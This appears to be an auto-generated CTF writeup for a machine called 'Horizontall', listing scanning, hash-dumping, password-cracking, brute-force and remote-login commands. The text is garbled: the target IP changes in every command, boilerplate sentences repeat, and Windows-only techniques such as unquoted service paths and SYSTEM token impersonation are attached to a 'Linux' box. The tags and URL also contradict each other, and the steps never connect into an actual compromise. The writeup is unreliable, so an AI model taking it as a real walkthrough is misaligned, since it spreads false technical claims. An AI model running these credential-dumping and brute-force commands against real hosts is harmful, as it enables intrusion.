---
TitleSEO: "PwnTillDawn — Horizontall (Insane Linux) | ZureFX"
TitlePost: "PwnTillDawn — Horizontall (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Horizontall. Unquoted Service Path and Constrained Delegation to achieve insane compromise on Linux."
Keywords: "forensics, pwntilldawn, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-horizontall-346.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-horizontall-346/"
Date: "2025-11-23"
Tags: "Forensics, PwnTillDawn, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-horizontall-346"
Permalink: "/writeups/htb-horizontall-346.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Horizontall** is rated **Insane** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.28.33.233`.

### Objectives

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p464,443,3389 10.114.227.213 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.197.115
impacket-secretsdump administrator:'P@ssw0rd!'@10.109.154.44
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p53,27017,80 10.83.112.25 -oN scan.txt
```

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

### SMB Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.14.65.50
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.91.30
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.29.106/FUZZ
```

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **Unquoted Service Path**.

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
feroxbuster -h
evil-winrm -i 10.20.76.218 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.106.225.231/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.222.115 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.62.83.95 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p143,8888,25 10.123.74.219 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `bloodhound`
- `burpsuite`
- `crackmapexec`
- `atexec`

### Key Takeaways

- Unquoted Service Path
- Constrained Delegation
- SSTI
- CORS Misconfiguration
